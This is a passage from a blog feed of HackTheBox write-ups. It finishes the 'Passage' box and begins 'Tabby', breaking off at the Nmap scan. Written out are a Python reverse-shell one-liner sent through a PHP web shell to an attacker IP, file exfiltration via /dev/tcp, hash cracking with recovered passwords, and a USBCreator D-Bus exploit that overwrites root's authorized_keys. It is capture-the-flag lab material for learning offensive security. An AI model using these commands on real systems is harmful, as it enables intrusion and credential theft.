<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">http://passage.htb/CuteNews/uploads/avatar_iamf_iamfr.php?cmd<span class="o">=</span>python3 -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.31&#34;,9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;</span>
</span></span></code></pre></div><p>I have an interactive shell now.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «passage» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ rlwrap nc -nvlp <span class="m">9001</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.206<span class="o">]</span> <span class="m">37062</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1678<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">www-data@passage:/var/www/html/CuteNews/uploads$ id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span></span><span class="line"><span class="cl">www-data@passage:/var/www/html/CuteNews/uploads$ python -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">www-data@passage:/var/www/html/CuteNews/uploads$
</span></span><span class="line"><span class="cl">www-data@passage:/var/www/html/CuteNews/uploads$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm-256color
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-paul">Shell as paul</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>There are two users in home directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@passage:/var/www/html/CuteNews/uploads$ ls -l /home
</span></span><span class="line"><span class="cl">ls -l /home
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">drwxr-x--- <span class="m">17</span> nadav nadav  <span class="m">4096</span> Mar <span class="m">5</span> 09:21 nadav
</span></span><span class="line"><span class="cl">drwxr-x--- <span class="m">17</span> paul  paul   <span class="m">4096</span> Mar <span class="m">5</span> 08:32 paul
</span></span></code></pre></div><p>On <code>/var/www/html/CuteNews/cdata/users</code>, I finds a bunch of PHP files contains data encoded in base64. Some of the file contains PHP tags.</p>
<p><div class="img-container"><img src="imgs/image-20210508025611714.png" alt="image-20210508025611714"  /></div>
</p>
<blockquote>
<p>Apologize for the image quality (also for the white background), it was recovered from my KeepNote app.</p>
</blockquote>
<p>I&rsquo;ll send those files to my machine as one file using <code>cat</code> and <code>dev/tcp</code> trick</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@passage:/var/www/html/CuteNews/cdata/users$ cat *.php &gt; /dev/tcp/10.10.14.31/9000
</span></span></code></pre></div><p>I redirected it to a file called <code>cdata.users</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «passage» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9000</span> &gt; cdata.users
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.206<span class="o">]</span> <span class="m">55022</span>
</span></span></code></pre></div><p>I can perform a bulk decode on the file contents after removing the PHP tags.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «passage» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ cat cdata.users<span class="p">|</span> sed <span class="s1">&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> <span class="p">|</span> base64 -d
</span></span><span class="line"><span class="cl">cat cdata.users<span class="p">|</span> sed <span class="s1">&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> <span class="p">|</span> base64 -d
</span></span><span class="line"><span class="cl">a:1:<span class="o">{</span>s:5:<span class="s2">&#34;email&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>s:16:<span class="s2">&#34;paul@passage.htb&#34;</span><span class="p">;</span>s:10:<span class="s2">&#34;paul-coles&#34;</span><span class="p">;</span><span class="o">}}</span>a:1:<span class="o">{</span>s:2:<span class="s2">&#34;id&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>i:1598829833<span class="p">;</span>s:6:<span class="s2">&#34;egre55&#34;</span><span class="p">;</span><span class="o">}}</span>a:1:<span class="o">{</span>s:5:<span class="s2">&#34;email&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>s:15:<span class="s2">&#34;ahaha@gmail.com&#34;</span><span class="p">;</span>s:8:<span class="s2">&#34;ivanpogi&#34;</span><span class="p">;</span><span class="o">}}</span>a:2:<span class="o">{</span>s:5:<span class="s2">&#34;email&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>s:15:<span class="s2">&#34;egre55@test.com&#34;</span><span class="p">;</span>s:6:<span class="s2">&#34;egre55&#34;</span><span class="p">;</span><span class="o">}</span>s:4:<span class="s2">&#34;name&#34;</span><span class="p">;</span>a:1:<span class="o">{</span>s:4:<span class="s2">&#34;debo&#34;</span><span class="p">;</span>a:11:<span class="o">{</span>s:2:<span class="s2">&#34;id&#34;</span><span class="p">;</span>s:10:<span class="s2">&#34;1599412470&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;name&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;debo&#34;</span><span class="p">;</span>s:3:<span class="s2">&#34;acl&#34;</span><span class="p">;</span>s:1:<span class="s2">&#34;4&#34;</span><span class="p">;</span>s:5:<span class="s2">&#34;email&#34;</span><span class="p">;</span>s:13:<span class="s2">&#34;debo@debo.com&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;nick&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;debo&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;pass&#34;</span><span class="p">;</span>s:64:<span class="s2">&#34;b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52&#34;</span><span class="p">;</span>s:4:<span class="s2">&#34;more&#34;</span><span class="p">;</span>s:60:<span class="s2">&#34;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&#34;</span><span class="p">;</span>s:6:<span class="s2">&#34;avatar&#34;</span><span class="p">;</span>s:20:<span class="s2">&#34;avatar_debo_bash.php&#34;</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>And that was a mess.</p>
<p>Among these outputs, there is one that interesting.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">...[SNIP]...&#34;pass&#34;;s:64:&#34;b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52&#34;...[SNIP]...
</span></span></code></pre></div><p><code>hash-identifier</code> identifies it as SHA-256.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «passage» «192.168.43.234»
</span></span><span class="line"><span class="cl">$ hash-identifier 84c7cd94cb0d818d27b16d4290d13703d380c54a4d3696fff4587b2862bf6068
</span></span><span class="line"><span class="cl">   <span class="c1">#########################################################################</span>
</span></span><span class="line"><span class="cl">   <span class="c1">#     __  __                     __           ______    _____           #</span>
</span></span><span class="line"><span class="cl">   <span class="c1">#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #</span>
</span></span><span class="line"><span class="cl">   <span class="c1">#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #</span>
</span></span><span class="line"><span class="cl">   <span class="c1">#     \ \  _  \  /&#39;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #</span>
</span></span><span class="line"><span class="cl">   <span class="c1">#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #</span>
</span></span><span class="line"><span class="cl">   <span class="c1">#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #</span>
</span></span><span class="line"><span class="cl">   <span class="c1">#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #</span>
</span></span><span class="line"><span class="cl">   <span class="c1">#                                                             By Zion3R #</span>
</span></span><span class="line"><span class="cl">   <span class="c1">#                                                    www.Blackploit.com #</span>
</span></span><span class="line"><span class="cl">   <span class="c1">#                                                   Root@Blackploit.com #</span>
</span></span><span class="line"><span class="cl">   <span class="c1">#########################################################################</span>
</span></span><span class="line"><span class="cl">--------------------------------------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Possible Hashs:
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> SHA-256
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Haval-256
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>It turns out that those exfiltrated files are how CuteNews stores its database (flat-file database, like <code>/etc/passwd</code>).</p>
<p><div class="img-container"><img src="imgs/image-20210508032901929.png" alt="image-20210508032901929"  /></div>
</p>
<p>Knowing that, I can add another filter using <code>grep</code> to grab the password hashes.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «passage» «192.168.43.234»
</span></span><span class="line"><span class="cl">$ cat cdata.users<span class="p">|</span> sed <span class="s1">&#39;s/&lt;?php[^&gt;]*&gt;//g&#39;</span> <span class="p">|</span> base64 -d <span class="p">|</span> grep -o -E -e <span class="s2">&#34;[0-9a-f]{64}&#34;</span>
</span></span><span class="line"><span class="cl">b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52
</span></span><span class="line"><span class="cl">7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
</span></span><span class="line"><span class="cl">5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
</span></span><span class="line"><span class="cl">231cd4eb21af3071fd441d5bb7e42dc5fd6f606cd20a8e3c158b7e7c2923f426
</span></span><span class="line"><span class="cl">41e5653fc7aeb894026d6bb7b2db7f65902b454945fa8fd65a6327047b5277fb
</span></span><span class="line"><span class="cl">4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
</span></span><span class="line"><span class="cl">03d09a66086da4ea6482d717ef1b33e23867afd965e2074e342584157393f91c
</span></span><span class="line"><span class="cl">e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
</span></span><span class="line"><span class="cl">f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
</span></span><span class="line"><span class="cl">84c7cd94cb0d818d27b16d4290d13703d380c54a4d3696fff4587b2862bf6068
</span></span><span class="line"><span class="cl">4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
</span></span><span class="line"><span class="cl">e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9
</span></span><span class="line"><span class="cl">59195c6c541c8307f1da2d1e768d6f2280c984df217ad5f4c64c3542b04111a4
</span></span></code></pre></div><h4 id="cracking-the-hashes">Cracking the Hashes</h4>
<p><code>hashcat</code> recovered five passwords.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ./hashcat.exe -m <span class="m">1400</span> hashes/passage.hashes ../rockyou.txt -O --show
</span></span><span class="line"><span class="cl">b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52:debo
</span></span><span class="line"><span class="cl">5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:password
</span></span><span class="line"><span class="cl">e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1
</span></span><span class="line"><span class="cl">e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9:hacker
</span></span><span class="line"><span class="cl">59195c6c541c8307f1da2d1e768d6f2280c984df217ad5f4c64c3542b04111a4:mario
</span></span></code></pre></div><h4 id="su---paul">SU - paul</h4>
<p>I tried to spray the passwords on SSH, but it wanted an SSH key. I tried again with <code>su</code>, and password <code>atlanta1</code> worked on <code>paul</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@passage:/home$ su paul 
</span></span><span class="line"><span class="cl">su paul
</span></span><span class="line"><span class="cl">Password: atlanta1
</span></span><span class="line"><span class="cl">paul@passage:~$ 
</span></span></code></pre></div><h3 id="shell-as-nadav">Shell as nadav</h3>
<h4 id="shared-ssh-keys">Shared SSH keys</h4>
<p>Escalating from <code>paul</code> to <code>nadav</code> is pretty straight forward, I found out that user <code>nadav</code> uses the same SSH keys as user <code>paul</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">paul@passage:~/.ssh$ cat id_rsa.pub <span class="o">&amp;&amp;</span> cat authorized_keys
</span></span><span class="line"><span class="cl">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
</span></span><span class="line"><span class="cl">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
</span></span></code></pre></div><p>So I can just SSH from <code>paul</code> to <code>nadav</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">paul@passage:~/.ssh$ ssh nadav@passage.htb
</span></span><span class="line"><span class="cl">Last login: Sun Sep  <span class="m">6</span> 11:12:03 <span class="m">2020</span> from 127.0.0.1
</span></span><span class="line"><span class="cl">nadav@passage:~$ id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>nadav<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>nadav<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>nadav<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,113<span class="o">(</span>lpadmin<span class="o">)</span>,128<span class="o">(</span>sambashare<span class="o">)</span>
</span></span></code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration-1">Internal enumeration</h4>
<p>Since <code>nadav</code> is a member of the <code>sudo</code> group, I can just type <code>sudo su</code> to escalate to root, but unfortunately it requires <code>nadav</code>&rsquo;s password.</p>
<p>So I looking around <code>nadav</code>&rsquo;s home directory, and there is a <code>.viminfo</code> file (not sure if it&rsquo;s from the box or other players).</p>
<p><div class="img-container"><img src="imgs/c0375013a91f483582b37eebffa521d4.png" alt="c0375013a91f483582b37eebffa521d4"  /></div>
</p>
<p>The file contains the following information.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"># Command Line History (newest to oldest):
</span></span><span class="line"><span class="cl">:wq
</span></span><span class="line"><span class="cl">:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"># File marks:
</span></span><span class="line"><span class="cl">&#39;0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
</span></span><span class="line"><span class="cl">&#39;1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Jumplist (newest first):
</span></span><span class="line"><span class="cl">-&#39;  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
</span></span><span class="line"><span class="cl">-&#39;  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
</span></span><span class="line"><span class="cl">-&#39;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
</span></span><span class="line"><span class="cl">-&#39;  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
</span></span><span class="line"><span class="cl">-&#39;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
</span></span><span class="line"><span class="cl">-&#39;  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># History of marks within files (newest to oldest):
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
</span></span><span class="line"><span class="cl">        &#34;       12      7
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
</span></span><span class="line"><span class="cl">        &#34;       2       0
</span></span><span class="line"><span class="cl">        .       2       0
</span></span><span class="line"><span class="cl">        +       2       0
</span></span></code></pre></div><p>The history of files points to these two configuration files:</p>
<ul>
<li><code>/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf</code></li>
<li><code>/etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf</code></li>
</ul>
<p>The <code>51-ubuntu-admin.conf</code> defines there are only two groups that can be used for authentication when administrator authentication is needed, <code>sudo</code> and <code>admin</code>. This file is used by <a href="https://www.freedesktop.org/software/polkit/docs/0.105/pklocalauthority.8.html">Polkit</a>, which allows unprivileged process to communicate with the privileged ones. In the GUI, the prompt that asks you to enter a password when performing an administrative tasks are using Polkit.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nadav@passage:~$ cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
</span></span><span class="line"><span class="cl"><span class="o">[</span>Configuration<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">AdminIdentities</span><span class="o">=</span>unix-group:sudo<span class="p">;</span>unix-group:admin
</span></span></code></pre></div><p>I don&rsquo;t really understand in depth about <code>com.ubuntu.USBCreator.conf</code>. What I know is, this configuration file is used by a service called “com.ubuntu.USBCreator” that is owned by root. The ones that can invoke the methods on this service are constrained by PolicyKit/Polkit, and they are anyone in the <code>sudo</code> or the <code>admin</code> group (defined by the <code>51-ubuntu-admin.conf</code> file)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">nadav@passage:~$ cat /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE busconfig PUBLIC
</span></span></span><span class="line"><span class="cl"><span class="cp"> &#34;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp"> &#34;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&#34;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;busconfig&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- Only root can own the service --&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;policy</span> <span class="na">user=</span><span class="s">&#34;root&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;allow</span> <span class="na">own=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/policy&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- Allow anyone to invoke methods (further constrained by
</span></span></span><span class="line"><span class="cl"><span class="c">       PolicyKit privileges --&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;policy</span> <span class="na">context=</span><span class="s">&#34;default&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;allow</span> <span class="na">send_destination=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span>
</span></span><span class="line"><span class="cl">           <span class="na">send_interface=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;allow</span> <span class="na">send_destination=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span>
</span></span><span class="line"><span class="cl">           <span class="na">send_interface=</span><span class="s">&#34;org.freedesktop.DBus.Introspectable&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;allow</span> <span class="na">send_destination=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span>
</span></span><span class="line"><span class="cl">           <span class="na">send_interface=</span><span class="s">&#34;org.freedesktop.DBus.Properties&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/policy&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/busconfig&gt;</span>
</span></span></code></pre></div><p>From here, it looks only <code>nadav</code> that can invoke the methods of this service</p>
<h4 id="usbcreator-d-bus-interface-vulnerability">USBCreator D-Bus Interface Vulnerability</h4>
<p>There is a research about a vulnerability in USBCreator D-Bus Interface, which can be used for local privilege escalation<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>. The research summary as follows:</p>
<p>&ldquo;<em>A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the sudoer group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root - without supplying a password. This trivially leads to elevated privileges, for instance, by overwriting the shadow file and setting a password for root. The issue was resolved in June when Ubuntu <a href="https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1832337">patched</a> the relevant packages in response to a vulnerability disclosure from Unit 42.</em>&rdquo;</p>
<p>The bug was first reported in 2016<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>, and the affected Ubuntu version is 16.04.</p>
<p><div class="img-container"><img src="imgs/image-20210508150754640.png" alt="image-20210508150754640"  /></div>
</p>
<p>The current machine is not an exact match, but since the vulnerability is patched in 2019, it may affect this version too.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nadav@passage:~$ uname -a
</span></span><span class="line"><span class="cl">Linux passage 4.15.0-45-generic <span class="c1">#48~16.04.1-Ubuntu SMP Sun Sep 6 14:31:10 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span></code></pre></div><h4 id="overwrite-authorized_keys">Overwrite authorized_keys</h4>
<p>One of the tools used by the researcher to exploit the vulnerability is a CLI-based called <code>gdbus</code>.</p>
<p>With user <code>nadav</code>, I can try to overwrite the authorized_keys file contents in the root directory with my public key.</p>
<p>I&rsquo;ll put my public key named <code>key</code> in <code>/dev/shm/</code>, and then I&rsquo;ll  invoke the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /dev/shm/key /root/.ssh/authorized_keys <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="o">()</span>
</span></span></code></pre></div><p>I tried to login as root using my private key, and it worked.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «passage» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ ssh -i root_rsa root@10.10.10.206
</span></span><span class="line"><span class="cl">Last login: Fri Mar  <span class="m">5</span> 17:33:39 <span class="m">2020</span> from 10.10.14.7
</span></span><span class="line"><span class="cl">root@passage:~# ls -l
</span></span><span class="line"><span class="cl">total <span class="m">12</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Jul <span class="m">21</span>  <span class="m">2020</span> exploits
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> root root   <span class="m">33</span> Mar  <span class="m">5</span> 17:05 root.txt
</span></span><span class="line"><span class="cl">root@passage:~# 
</span></span></code></pre></div><div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p><a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p><a href="https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1568149">https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1568149</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Tabby</title>
      <link>https://fahmifj.github.io/hackthebox/tabby/</link>
      <pubDate>Sat, 07 Nov 2020 13:34:34 +0000</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/tabby/</guid>
      <description>Abusing Tomcat manager-script roles and escalate to root with LXC container</description>
      <content:encoded><![CDATA[<p>Tabby is an easy Linux box that starts off by identifying and leveraging an LFI vulnerability to find tomcat credentials. The credentials can be used to gain a foothold on the system by deploying a malicious <code>.war</code> file via Tomcat Manager. Internal enumeration finds a password protected backup file, and it can be cracked to recover the password. The password turns out to be reused by the user on the box. The user is a member of the lxd group, and this group can be leveraged to gain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Local File Inclusion</li>
<li>Abusing Tomcat <code>manager-script</code> roles</li>
<li>Privilege escalation with lxc/lxd group.</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>BurpSuite - <a href="https://portswigger.net/burp">https://portswigger.net/burp</a></li>
<li>curl - Preinstalled in Kali Linux</li>
<li>msfvenom - Preinstalled in Kali Linux</li>
<li>alpine-builder - <a href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «tabby» «10.10.14.30»
</span></span><span class="line"><span class="cl">$ nmap -sC -sV -oA nmap/initial-tabby 10.10.10.194
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
